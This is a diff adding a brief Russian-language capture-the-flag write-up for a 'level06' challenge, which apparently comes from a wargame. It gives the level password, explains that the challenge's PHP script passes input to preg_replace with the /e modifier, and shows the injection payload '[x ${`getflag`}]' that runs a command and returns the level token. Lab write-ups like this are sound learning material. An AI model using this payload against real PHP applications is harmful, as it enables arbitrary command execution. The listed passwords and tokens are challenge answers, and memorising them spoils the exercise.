@@ -1,0 +1,15 @@
+su level06
+pass: viuaaale9huek52boumoomioc
+
+ls -l
+Видим php и исполняемый файлы. Запускаем исполняемый файл, получаем варнинг в функции file_get_contents из php скрипта,
+проверяем что записано в level06.php
+cat level06.php
+Видим что используется несколько раз preg_replace, в том числе один раз с модификатором /e - который экранирует знаки `,
+поэтому мы не можем просто послать туда `getflag` - он не проинтерпетируется на выводе.
+Но мы можем вызвать ошибку в выводе которой будет `getflag` уже без экранирования
+
+echo '[x ${`getflag`}]' > /tmp/getflag
+./level06 /tmp/getflag
+
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
